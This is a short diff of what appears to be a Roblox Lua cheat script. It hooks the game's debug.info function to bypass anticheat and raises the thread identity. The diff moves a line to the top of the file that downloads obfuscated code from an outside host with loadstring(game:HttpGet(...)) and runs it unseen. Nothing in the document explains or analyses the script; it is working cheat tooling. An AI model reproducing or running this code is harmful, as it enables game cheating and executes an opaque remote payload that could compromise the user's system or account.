@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://beta.vonalia.com/Obfuscate/nznt"))()
+
 -- Anticheat bypass
 local d = false
 local h = {}
@@ -32,6 +34,3 @@ local o; o = hookfunction(getrenv().debug.info, newcclosure(function(...)
     return o(...)
 end))
 setthreadidentity(7)
-
-loadstring(game:HttpGet("https://beta.vonalia.com/Obfuscate/nznt"))()
-
